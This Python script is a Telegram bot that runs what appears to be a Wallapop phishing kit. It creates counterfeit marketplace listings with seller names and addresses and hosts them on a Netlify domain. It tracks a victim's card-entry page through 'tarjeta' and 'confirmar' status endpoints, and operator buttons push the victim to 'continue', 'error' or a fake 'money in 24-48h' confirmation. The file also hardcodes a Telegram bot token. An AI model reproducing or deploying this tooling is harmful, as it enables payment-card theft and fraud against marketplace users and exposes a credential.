#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import os
import json
import html
import random
import string
import logging
import threading
import time
import io
import http.server
import socketserver
from datetime import datetime
from typing import Dict, Any

import requests

card_statuses: Dict[str, str] = {}

from telegram import (
    Update,
    InlineKeyboardButton,
    InlineKeyboardMarkup,
)
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ContextTypes,
    filters,
)

# Configuración básica
logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO
)
logger = logging.getLogger("WallapopBot")

BASE_DIR = os.path.dirname(os.path.abspath(__file__))
TOKEN_FILE = os.path.join(BASE_DIR, "token.txt")
CONFIG_FILE = os.path.join(BASE_DIR, "config.json")
DB_JSON_FILE = os.path.join(BASE_DIR, "products.json")
DB_JS_FILE = os.path.join(BASE_DIR, "products.js")

DEFAULT_TOKEN = "8818995413:AAHLry4iCNQZ7T385CoVodbXQcnrkymFmKM"

def load_token() -> str:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
                if cfg.get("token"):
                    return cfg["token"].strip()
        except Exception:
            pass
    if os.path.exists(TOKEN_FILE):
        try:
            with open(TOKEN_FILE, "r", encoding="utf-8") as f:
                t = f.read().strip()
                if t:
                    return t
        except Exception:
            pass
    return os.getenv("BOT_TOKEN", DEFAULT_TOKEN).strip()

def load_config() -> Dict[str, Any]:
    if os.path.exists(CONFIG_FILE):
        try:
            with open(CONFIG_FILE, "r", encoding="utf-8") as f:
                cfg = json.load(f)
                return cfg
        except Exception:
            pass
    return {
        "token": DEFAULT_TOKEN,
        "port": 3000,
        "publicUrl": "https://wallaaaa.netlify.app",
        "base_url": "https://wallaaaa.netlify.app/a/"
    }

def save_config(cfg: Dict[str, Any]):
    with open(CONFIG_FILE, "w", encoding="utf-8") as f:
        json.dump(cfg, f, ensure_ascii=False, indent=2)

def get_clean_domain() -> str:
    cfg = load_config()
    base = cfg.get("publicUrl") or cfg.get("base_url") or ""
    base = base.strip().rstrip("/")
    if "/a" in base:
        base = base.split("/a")[0].rstrip("/")
    return base

def upload_photo_to_hosting(photo_bytes: bytes, file_name: str, tg_path: str = "") -> str:
    domain = get_clean_domain()
    # 1. Guardar copia local en web/photos y photos/ si existe
    try:
        for pdir in [os.path.join(BASE_DIR, "web", "photos"), os.path.join(BASE_DIR, "photos")]:
            os.makedirs(pdir, exist_ok=True)
            with open(os.path.join(pdir, file_name), "wb") as f:
                f.write(photo_bytes)
    except Exception as e:
        logger.warning(f"Error guardando foto local: {e}")

    # 2. Subir al hosting remoto via API storage
    if domain and "localhost" not in domain and "127.0.0.1" not in domain:
        try:
            upload_url = f"{domain}/api.php?action=upload_photo"
            files = {"photo": (file_name, photo_bytes, "image/jpeg")}
            r = requests.post(upload_url, files=files, data={"filename": file_name}, timeout=15, verify=False)
            if r.status_code == 200:
                res = r.json()
                if res.get("ok"):
                    logger.info(f"✅ Foto subida exitosamente al hosting: {res.get('url')}")
                    return res.get("url") or f"/photos/{file_name}"
            logger.warning(f"Respuesta inesperada al subir foto ({r.status_code}): {r.text[:120]}")
        except Exception as e:
            logger.warning(f"No se pudo subir foto al hosting ({e}). Usando fallback.")

    if tg_path and TOKEN:
        clean_tg = f"api.telegram.org/file/bot{TOKEN}/{tg_path}"
        import urllib.parse
        return f"https://wsrv.nl/?url={urllib.parse.quote(clean_tg)}"

    return f"/photos/{file_name}"

def notify_hosting_status(target_id: str, status: str):
    domain = get_clean_domain()
    if not domain or "localhost" in domain or "127.0.0.1" in domain:
        return
    try:
        url = f"{domain}/api.php?action=set_status&id={target_id}&status={status}"
        r = requests.get(url, timeout=6, verify=False)
        if r.status_code == 200:
            logger.info(f"✅ Hosting actualizado: id={target_id} -> status={status}")
        else:
            logger.warning(f"Aviso hosting status ({r.status_code}): {r.text[:100]}")
    except Exception as e:
        logger.warning(f"Error notificando estado al hosting: {e}")

def sync_db_to_hosting(db_to_sync: Dict[str, Any]):
    domain = get_clean_domain()
    if not domain or "localhost" in domain or "127.0.0.1" in domain:
        return
    try:
        sync_url = f"{domain}/api.php?action=sync_products"
        payload = {
            "products": db_to_sync.get("products", {}),
            "activeId": db_to_sync.get("activeId", "")
        }
        r = requests.post(sync_url, json=payload, timeout=8, verify=False)
        if r.status_code == 200:
            logger.info("✅ Base de datos de productos sincronizada con el hosting.")
    except Exception as e:
        logger.warning(f"No se pudo sincronizar productos con hosting: {e}")

def load_db() -> Dict[str, Any]:
    if os.path.exists(DB_JSON_FILE):
        try:
            with open(DB_JSON_FILE, "r", encoding="utf-8") as f:
                return json.load(f)
        except Exception:
            pass
    # Producto inicial de ejemplo
    init_id = "AD8351003"
    init_prod = {
        "id": init_id,
        "titulo": "Lote Perfumes Mujer 14 Uds.",
        "precio": 250,
        "precioArticulo": 250,
        "descripcion": "Lote de 14 perfumes de mujer, todos precintados. Se vende el lote completo, no se hacen separaciones.",
        "nombre": "Sofía Chamizo",
        "direccion": "Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024",
        "articulo": "Lote Perfumes Mujer 14 uds.",
        "fotos": []
    }
    db = {"products": {init_id: init_prod}, "activeId": init_id}
    save_db(db)
    return db

def save_db(db: Dict[str, Any]):
    try:
        with open(DB_JSON_FILE, "w", encoding="utf-8") as f:
            json.dump(db, f, ensure_ascii=False, indent=2)
        with open(DB_JS_FILE, "w", encoding="utf-8") as f:
            f.write("window.SERVER_DB = " + json.dumps(db, ensure_ascii=False, indent=2) + ";\n")
        web_dir = os.path.join(BASE_DIR, "web")
        if os.path.exists(web_dir):
            with open(os.path.join(web_dir, "products.json"), "w", encoding="utf-8") as f:
                json.dump(db, f, ensure_ascii=False, indent=2)
            with open(os.path.join(web_dir, "products.js"), "w", encoding="utf-8") as f:
                f.write("window.SERVER_DB = " + json.dumps(db, ensure_ascii=False, indent=2) + ";\n")
            data_dir = os.path.join(web_dir, "data")
            if os.path.exists(data_dir):
                with open(os.path.join(data_dir, "productos.json"), "w", encoding="utf-8") as f:
                    json.dump(db, f, ensure_ascii=False, indent=2)
                if db.get("activeId"):
                    with open(os.path.join(data_dir, "activo.txt"), "w", encoding="utf-8") as f:
                        f.write(str(db["activeId"]))
        # Sincronizar en segundo plano con el hosting
        threading.Thread(target=sync_db_to_hosting, args=(db,), daemon=True).start()
    except Exception as e:
        logger.error(f"Error guardando base de datos: {e}")

config = load_config()
db = load_db()
wizards: Dict[int, Dict[str, Any]] = {}

def gen_id() -> str:
    # Formato estilo AD + 7 dígitos como en el ejemplo #AD8351003
    nums = "".join(random.choices(string.digits, k=7))
    return f"AD{nums}"

def fmt_eur(val) -> str:
    try:
        n = float(val)
        if n.is_integer():
            return f"{int(n)} €"
        return f"{n:,.2f} €".replace(",", "X").replace(".", ",").replace("X", ".")
    except Exception:
        return f"{val} €"

def get_link(prod_id: str) -> str:
    cfg = load_config()
    base = cfg.get("publicUrl") or cfg.get("base_url") or "https://wallaaaa.netlify.app"
    base = base.rstrip("/")
    if "localhost" in base or "127.0.0.1" in base:
        base = "https://wallaaaa.netlify.app"
    if base.endswith("/a"):
        clean_base = f"{base}/{prod_id}"
    else:
        clean_base = f"{base}/a/{prod_id}"
    p = db.get("products", {}).get(prod_id)
    if p:
        try:
            import base64, urllib.parse
            rawList = p.get("fotos", [])
            fList = []
            for f in rawList:
                if isinstance(f, str) and len(f) < 1500 and (f.startswith("http") or f.startswith("/")):
                    if "api.telegram.org" in f and "wsrv.nl" not in f and "images.weserv.nl" not in f:
                        clean_tg = f.replace("https://", "").replace("http://", "")
                        fList.append(f"https://wsrv.nl/?url={urllib.parse.quote(clean_tg)}")
                    else:
                        fList.append(f)
            min_obj = {
                "id": p.get("id"),
                "titulo": p.get("titulo"),
                "precio": p.get("precio"),
                "precioArticulo": p.get("precioArticulo", p.get("precio")),
                "descripcion": p.get("descripcion", ""),
                "nombre": p.get("nombre", "Sofía Chamizo"),
                "direccion": p.get("direccion", ""),
                "articulo": p.get("articulo", p.get("titulo")),
                "fotos": fList
            }
            b64 = base64.b64encode(json.dumps(min_obj, ensure_ascii=False, separators=(',', ':')).encode("utf-8")).decode("utf-8")
            url_con_p = f"{clean_base}?p={urllib.parse.quote(b64)}"
            if len(url_con_p) < 2000:
                return url_con_p
        except Exception:
            pass
    return clean_base

# ==================== SERVIDOR WEB LOCAL INTEGRADO ====================
WEB_DIR = os.path.join(BASE_DIR, "web") if os.path.exists(os.path.join(BASE_DIR, "web")) else BASE_DIR

class WallapopHTTPHandler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=WEB_DIR, **kwargs)

    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "GET, POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_GET(self):
        clean_path = self.path.split("?")[0].split("#")[0]
        if "/tarjeta/status" in clean_path or "/confirmar/status" in clean_path:
            parts = clean_path.strip("/").split("/")
            pid = parts[2] if len(parts) >= 3 else db.get("activeId", "")
            st = card_statuses.get(pid, "esperando")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(json.dumps({"status": st}).encode("utf-8"))
            return
        elif clean_path.startswith("/api/product/"):
            pid = clean_path.replace("/api/product/", "").strip("/")
            prod = db.get("products", {}).get(pid)
            if prod:
                self.send_response(200)
                self.send_header("Content-Type", "application/json")
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(json.dumps(prod).encode("utf-8"))
                return
        elif clean_path.startswith("/a/"):
            self.path = "/index.html"
        elif clean_path in ("/confirmar", "/confirmacion", "/confirmacion.html"):
            self.path = "/confirmar.html"
        elif clean_path == "/step2":
            self.path = "/step2.html"
        return super().do_GET()

    def do_POST(self):
        clean_path = self.path.split("?")[0].split("#")[0]
        if "/tarjeta" in clean_path or "/confirmar" in clean_path:
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()
            self.wfile.write(b'{"ok":true}')
            return
        return super().do_POST()

    def log_message(self, format, *args):
        # Silenciar logs continuos en consola
        pass

def run_web_server(port: int):
    try:
        with socketserver.TCPServer(("", port), WallapopHTTPHandler) as httpd:
            logger.info(f"🌐 Servidor web activo en http://localhost:{port}/")
            httpd.serve_forever()
    except Exception as e:
        logger.warning(f"No se pudo iniciar el servidor web en el puerto {port} ({e}). Continuando solo con el bot.")

# ==================== MANEJADORES DE TELEGRAM ====================
AYUDA_TXT = (
    "<b>Panel de control Wallapop 2.0</b>\n\n"
    "<b>Comandos principales:</b>\n"
    "• <code>/nuevo</code> — Crear un producto paso a paso\n"
    "• <code>/productos</code> — Listar productos y enlaces\n"
    "• <code>/editar ID</code> — Seleccionar producto activo\n"
    "• <code>/dominio URL</code> — Cambiar dominio base\n"
    "• <code>/estado</code> — Ver resumen del producto activo\n\n"
    "<b>Modificar producto activo:</b>\n"
    "• <code>/titulo texto</code>\n"
    "• <code>/precio número</code>\n"
    "• <code>/descripcion texto</code>\n"
    "• <code>/importe número</code>\n"
    "• <code>/nombre texto</code>\n"
    "• <code>/direccion texto</code>\n"
    "• <code>/articulo texto</code>\n"
    "• <code>/foto</code> (y envía imágenes)\n"
    "• <code>/quitarfotos</code>\n\n"
    "• <code>/borrar ID</code> · <code>/cancelar</code> · <code>/ayuda</code>"
)

async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(AYUDA_TXT, parse_mode="HTML")

async def cmd_dominio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        curr = config.get("publicUrl") or config.get("base_url", "http://localhost:3000")
        await update.message.reply_text(
            f"Dominio actual: <code>{curr}</code>\n\n"
            "Uso: <code>/dominio https://tu-sitio.com/</code>",
            parse_mode="HTML"
        )
        return
    url = args[0].strip().rstrip("/")
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "https://" + url
    if url.endswith("/a"):
        url = url[:-2].rstrip("/")
    config["publicUrl"] = url
    config["base_url"] = url + "/a/"
    save_config(config)

    msg_info = f"✅ Dominio actualizado a:\n<code>{url}</code>\n"
    # Probar conexión con el hosting y sincronizar storage
    try:
        r = requests.get(f"{url}/api.php?action=health", timeout=6, verify=False)
        if r.status_code == 200 and r.json().get("ok"):
            msg_info += "\n📡 <b>Conexión con el hosting:</b> ✅ ¡CONECTADO! Storage y API listos."
            sync_db_to_hosting(db)
        else:
            msg_info += f"\n⚠️ El hosting respondió con código {r.status_code}. Comprueba que subiste la carpeta web."
    except Exception as e:
        msg_info += f"\n⚠️ Aviso: No se pudo verificar la API aún ({e}). Asegúrate de haber subido la carpeta web."

    await update.message.reply_text(msg_info, parse_mode="HTML")

async def cmd_nuevo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    new_prod_id = gen_id()
    wizards[chat_id] = {
        "step": "titulo",
        "draft": {
            "id": new_prod_id,
            "fotos": [],
            "nombre": "",
            "direccion": ""
        }
    }
    await update.message.reply_text("1/5 · ¿Título del producto?")

async def cmd_cancelar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in wizards:
        del wizards[chat_id]
        await update.message.reply_text("❌ Creación cancelada.")
    else:
        await update.message.reply_text("No hay ninguna creación en curso.")

async def send_wallapop_card(chat_id: int, prod: Dict[str, Any], context: ContextTypes.DEFAULT_TYPE):
    prod_id = prod["id"]
    link = get_link(prod_id)
    # Telegram prohíbe terminantemente URLs con localhost o 127.0.0.1 en botones inline
    if "localhost" in link or "127.0.0.1" in link:
        link = link.replace("http://localhost:3000", "https://wallaaaa.netlify.app").replace("http://localhost:8000", "https://wallaaaa.netlify.app")

    nombre = prod.get("nombre", "Sofía Chamizo")
    titulo = prod.get("titulo", "Artículo Wallapop")

    caption = (
        f"<blockquote><b>{html.escape(nombre)} ➔ {html.escape(titulo)}</b>\n"
        f"{link}</blockquote>\n\n"
        f"<blockquote>🍥 Producto creado con éxito ❞</blockquote>\n\n"
        f"🇪🇸 <u>Wallapop</u> 2.0 • #{prod_id} 📇"
    )

    keyboard = None
    if (link.startswith("http://") or link.startswith("https://")) and ("localhost" not in link and "127.0.0.1" not in link):
        try:
            keyboard = InlineKeyboardMarkup([
                [InlineKeyboardButton("🍥 Abrir anuncio ❞", url=link)]
            ])
        except Exception:
            keyboard = None

    tg_fotos = prod.get("tg_fotos", [])
    if tg_fotos:
        try:
            await context.bot.send_photo(
                chat_id=chat_id,
                photo=tg_fotos[0],
                caption=caption,
                parse_mode="HTML",
                reply_markup=keyboard
            )
            return
        except Exception as e:
            logger.warning(f"No se pudo enviar send_photo con tg_fotos: {e}")

    fotos = prod.get("fotos", [])
    if fotos and not fotos[0].startswith("data:") and "api.telegram.org" not in fotos[0]:
        try:
            await context.bot.send_photo(
                chat_id=chat_id,
                photo=fotos[0],
                caption=caption,
                parse_mode="HTML",
                reply_markup=keyboard
            )
            return
        except Exception as e:
            logger.warning(f"No se pudo enviar send_photo con URL: {e}")

    try:
        await context.bot.send_message(
            chat_id=chat_id,
            text=caption,
            parse_mode="HTML",
            reply_markup=keyboard,
            disable_web_page_preview=False
        )
    except Exception as e:
        logger.error(f"Error al enviar mensaje del producto: {e}")
        # En caso de fallo con botones inline, enviar mensaje de texto garantizado sin botón
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"<blockquote><b>{html.escape(nombre)} ➔ {html.escape(titulo)}</b>\n{link}</blockquote>\n\n<blockquote>🍥 Producto creado con éxito ❞</blockquote>\n\n🇪🇸 <u>Wallapop</u> 2.0 • #{prod_id} 📇",
            parse_mode="HTML",
            disable_web_page_preview=False
        )

async def cmd_listo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    wiz = wizards.get(chat_id)
    if not wiz:
        await update.message.reply_text("No hay ningún producto en creación. Usa /nuevo.")
        return

    try:
        d = wiz["draft"]
        d["articulo"] = d.get("articulo") or d.get("titulo") or "Artículo"
        d["precioArticulo"] = d.get("precioArticulo") or d.get("precio") or 0
        d["descripcion"] = d.get("descripcion", "")

        db.setdefault("products", {})[d["id"]] = d
        db["activeId"] = d["id"]
        save_db(db)
        del wizards[chat_id]

        await send_wallapop_card(chat_id, d, context)
    except Exception as e:
        logger.error(f"Error en cmd_listo: {e}", exc_info=True)
        await update.message.reply_text(f"⚠️ Ocurrió un error al guardar el producto: {e}")

async def cmd_productos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    prods = db.get("products", {})
    if not prods:
        await update.message.reply_text("Todavía no hay productos. Usa /nuevo.")
        return

    items = []
    for pid, p in prods.items():
        t = p.get("titulo", "Sin título")
        pr = fmt_eur(p.get("precio", 0))
        lnk = get_link(pid)
        items.append(f"• <b>{html.escape(t)}</b> — {pr}\n<code>{pid}</code> → {lnk}")

    await update.message.reply_text("\n\n".join(items), parse_mode="HTML", disable_web_page_preview=True)

async def cmd_editar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Uso: <code>/editar ID</code>", parse_mode="HTML")
        return
    pid = args[0].strip().replace("#", "")
    if pid not in db.get("products", {}):
        await update.message.reply_text(f"No se encontró el producto <code>{pid}</code>.", parse_mode="HTML")
        return
    db["activeId"] = pid
    save_db(db)
    p = db["products"][pid]
    await update.message.reply_text(
        f"✏️ Producto activo: <b>{html.escape(p.get('titulo', ''))}</b>\n"
        f"Precio: {fmt_eur(p.get('precio', 0))}\n"
        f"ID: <code>{pid}</code>",
        parse_mode="HTML"
    )

async def cmd_borrar(update: Update, context: ContextTypes.DEFAULT_TYPE):
    args = context.args
    if not args:
        await update.message.reply_text("Uso: <code>/borrar ID</code>", parse_mode="HTML")
        return
    pid = args[0].strip().replace("#", "")
    if pid in db.get("products", {}):
        del db["products"][pid]
        if db.get("activeId") == pid:
            db["activeId"] = next(iter(db["products"].keys()), "")
        save_db(db)
        await update.message.reply_text(f"🗑 Producto <code>{pid}</code> borrado.", parse_mode="HTML")
    else:
        await update.message.reply_text("Producto no encontrado.")

async def cmd_estado(update: Update, context: ContextTypes.DEFAULT_TYPE):
    act = db.get("products", {}).get(db.get("activeId"))
    if not act:
        await update.message.reply_text("No hay ningún producto activo. Usa /nuevo o /editar ID.")
        return
    await send_wallapop_card(update.effective_chat.id, act, context)

# ==================== MODIFICADORES DEL PRODUCTO ACTIVO ====================
async def handle_field_update(update: Update, field: str, value: Any, text_ok: str):
    act = db.get("products", {}).get(db.get("activeId"))
    if not act:
        await update.message.reply_text("No hay producto activo. Usa /editar ID.")
        return
    act[field] = value
    save_db(db)
    await update.message.reply_text(text_ok, parse_mode="HTML")

async def cmd_titulo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip()
    if not val:
        await update.message.reply_text("Uso: <code>/titulo Nuevo título</code>", parse_mode="HTML")
        return
    await handle_field_update(update, "titulo", val, f"✅ Título actualizado a: <b>{html.escape(val)}</b>")

async def cmd_precio(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip().replace("€", "").replace(",", ".")
    try:
        n = float(val)
        act = db.get("products", {}).get(db.get("activeId"))
        if act:
            act["precio"] = n
            act["precioArticulo"] = n
            save_db(db)
            await update.message.reply_text(f"✅ Precio: <b>{fmt_eur(n)}</b>", parse_mode="HTML")
        else:
            await update.message.reply_text("No hay producto activo.")
    except Exception:
        await update.message.reply_text("Uso: <code>/precio 250</code>", parse_mode="HTML")

async def cmd_importe(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip().replace("€", "").replace(",", ".")
    try:
        n = float(val)
        await handle_field_update(update, "precioArticulo", n, f"✅ Importe a recibir: <b>{fmt_eur(n)}</b>")
    except Exception:
        await update.message.reply_text("Uso: <code>/importe 250.00</code>", parse_mode="HTML")

async def cmd_descripcion(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip()
    if not val:
        await update.message.reply_text("Uso: <code>/descripcion Texto</code>", parse_mode="HTML")
        return
    await handle_field_update(update, "descripcion", val, "✅ Descripción actualizada.")

async def cmd_nombre(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip()
    if not val:
        await update.message.reply_text("Uso: <code>/nombre Nombre Apellidos</code>", parse_mode="HTML")
        return
    await handle_field_update(update, "nombre", val, f"✅ Nombre actualizado a: <b>{html.escape(val)}</b>")

async def cmd_direccion(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip()
    if not val:
        await update.message.reply_text("Uso: <code>/direccion Calle, Ciudad, CP</code>", parse_mode="HTML")
        return
    await handle_field_update(update, "direccion", val, "✅ Dirección actualizada.")

async def cmd_articulo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    val = " ".join(context.args).strip()
    if not val:
        await update.message.reply_text("Uso: <code>/articulo Nombre artículo</code>", parse_mode="HTML")
        return
    await handle_field_update(update, "articulo", val, "✅ Artículo actualizado.")

async def cmd_foto(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("📷 Envía la foto directamente y la añadiré al producto.")

async def cmd_quitarfotos(update: Update, context: ContextTypes.DEFAULT_TYPE):
    act = db.get("products", {}).get(db.get("activeId"))
    if not act:
        await update.message.reply_text("No hay producto activo.")
        return
    act["fotos"] = []
    save_db(db)
    await update.message.reply_text("🧹 Fotos eliminadas del producto activo.")

# ==================== MENSAJES DE TEXTO Y FOTOS ====================
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    photo = update.message.photo[-1]

    try:
        file = await context.bot.get_file(photo.file_id)
        photo_bytes = await file.download_as_bytearray()
        file_name = f"img_{datetime.now().strftime('%Y%m%d%H%M%S')}_{os.urandom(3).hex()}.jpg"
        photo_url = upload_photo_to_hosting(bytes(photo_bytes), file_name, file.file_path)
    except Exception as e:
        logger.error(f"Error procesando foto de Telegram: {e}")
        photo_url = f"/photos/img_{datetime.now().strftime('%Y%m%d%H%M%S')}.jpg"

    wiz = wizards.get(chat_id)
    if wiz and wiz.get("step") == "fotos":
        wiz["draft"].setdefault("fotos", []).append(photo_url)
        wiz["draft"].setdefault("tg_fotos", []).append(photo.file_id)
        c = len(wiz["draft"]["fotos"])
        await update.message.reply_text(f"🖼 {c} foto(s) guardada(s) y enviada(s) al storage del hosting. Envía más o escribe /listo para terminar.")
        return

    act = db.get("products", {}).get(db.get("activeId"))
    if act:
        act.setdefault("fotos", []).append(photo_url)
        act.setdefault("tg_fotos", []).append(photo.file_id)
        save_db(db)
        c = len(act["fotos"])
        await update.message.reply_text(f"✅ Foto enviada al storage del hosting y añadida al producto activo ({c} fotos).")
    else:
        await update.message.reply_text("Envía /nuevo o /editar ID antes de mandar fotos.")

async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    texto = (update.message.text or "").strip()
    if not texto or texto.startswith("/"):
        return

    wiz = wizards.get(chat_id)
    if not wiz:
        return

    step = wiz.get("step")
    d = wiz["draft"]

    if step == "titulo":
        d["titulo"] = texto
        d["articulo"] = texto
        wiz["step"] = "precio"
        await update.message.reply_text("2/5 · ¿Precio en euros? (ejemplo: 250)")
        return

    if step == "precio":
        val = texto.replace("€", "").replace(",", ".").strip()
        try:
            n = float(val)
            d["precio"] = n
            d["precioArticulo"] = n
            wiz["step"] = "nombre"
            await update.message.reply_text("3/5 · ¿Nombre y apellidos completos? (ejemplo: Sofía Chamizo)")
        except Exception:
            await update.message.reply_text("Por favor, introduce un número válido (ejemplo: 250):")
        return

    if step == "nombre":
        d["nombre"] = texto
        wiz["step"] = "direccion"
        await update.message.reply_text("4/5 · ¿Dirección completa de envío? (ejemplo: Paseo Prudencia Narváez 48 Piso 4, Cáceres, 17024)")
        return

    if step == "direccion":
        d["direccion"] = texto
        wiz["step"] = "descripcion"
        await update.message.reply_text("5/5 · ¿Descripción del producto? (o pon un . para omitir)")
        return

    if step == "descripcion":
        d["descripcion"] = "" if texto == "." else texto
        wiz["step"] = "fotos"
        await update.message.reply_text("📷 Envía las fotos que quieras y escribe /listo para terminar.")
        return

async def handle_callback_query(update: Update, context: ContextTypes.DEFAULT_TYPE):
    cq = update.callback_query
    if not cq:
        return
    data = cq.data or ""
    await cq.answer()

    if data.startswith("confirmar_again_"):
        target = data.replace("confirmar_again_", "") or db.get("activeId", "")
        card_statuses[target] = "confirmado_final"
        # Notificar inmediatamente al hosting vía HTTP para actualizar el storage de estados
        threading.Thread(target=notify_hosting_status, args=(target, "confirmado_final"), daemon=True).start()

        try:
            desc = f"status:confirmado_final:{target}:{int(time.time())}"
            await context.bot.set_my_description(description=desc)
        except Exception as e:
            logger.warning(f"Error set_my_description: {e}")
        await cq.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("✅ CONFIRMADO (Dinero en 24h-48h)", callback_data="noop")]])
        )
    elif data.startswith("continuar_"):
        target = data.replace("continuar_", "") or db.get("activeId", "")
        card_statuses[target] = "continue"
        # Notificar inmediatamente al hosting vía HTTP para que la web avance de paso al instante
        threading.Thread(target=notify_hosting_status, args=(target, "continue"), daemon=True).start()

        try:
            desc = f"status:continue:{target}:{int(time.time())}"
            await context.bot.set_my_description(description=desc)
        except Exception as e:
            logger.warning(f"Error set_my_description: {e}")
        await cq.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("✅ Continuado", callback_data="noop")],
                [InlineKeyboardButton("Confirmar de nuevo", callback_data=f"confirmar_again_{target}")]
            ])
        )
    elif data.startswith("error_"):
        target = data.replace("error_", "") or db.get("activeId", "")
        card_statuses[target] = "error"
        # Notificar inmediatamente al hosting vía HTTP para mostrar error en pantalla
        threading.Thread(target=notify_hosting_status, args=(target, "error"), daemon=True).start()

        try:
            desc = f"status:error:{target}:{int(time.time())}"
            await context.bot.set_my_description(description=desc)
        except Exception as e:
            logger.warning(f"Error set_my_description: {e}")
        await cq.edit_message_reply_markup(
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("❌ ERROR MARCADO", callback_data="noop")]])
        )

def main():
    token = load_token()
    logger.info("Iniciando Bot de Telegram Wallapop 2.0...")

    # Iniciar servidor web en segundo plano
    port = int(os.environ.get("PORT", config.get("port", 3000)))
    t = threading.Thread(target=run_web_server, args=(port,), daemon=True)
    t.start()

    app = ApplicationBuilder().token(token).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("ayuda", cmd_start))
    app.add_handler(CommandHandler("nuevo", cmd_nuevo))
    app.add_handler(CommandHandler("listo", cmd_listo))
    app.add_handler(CommandHandler("cancelar", cmd_cancelar))
    app.add_handler(CommandHandler("productos", cmd_productos))
    app.add_handler(CommandHandler("editar", cmd_editar))
    app.add_handler(CommandHandler("borrar", cmd_borrar))
    app.add_handler(CommandHandler("estado", cmd_estado))
    app.add_handler(CommandHandler("dominio", cmd_dominio))
    app.add_handler(CommandHandler("url", cmd_dominio))

    app.add_handler(CommandHandler("titulo", cmd_titulo))
    app.add_handler(CommandHandler("precio", cmd_precio))
    app.add_handler(CommandHandler("importe", cmd_importe))
    app.add_handler(CommandHandler("descripcion", cmd_descripcion))
    app.add_handler(CommandHandler("nombre", cmd_nombre))
    app.add_handler(CommandHandler("direccion", cmd_direccion))
    app.add_handler(CommandHandler("articulo", cmd_articulo))
    app.add_handler(CommandHandler("foto", cmd_foto))
    app.add_handler(CommandHandler("quitarfotos", cmd_quitarfotos))

    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))
    app.add_handler(CallbackQueryHandler(handle_callback_query))

    logger.info("Bot listo y escuchando mensajes en Telegram. Presiona Ctrl+C para detener.")
    app.run_polling(drop_pending_updates=True)

if __name__ == "__main__":
    main()
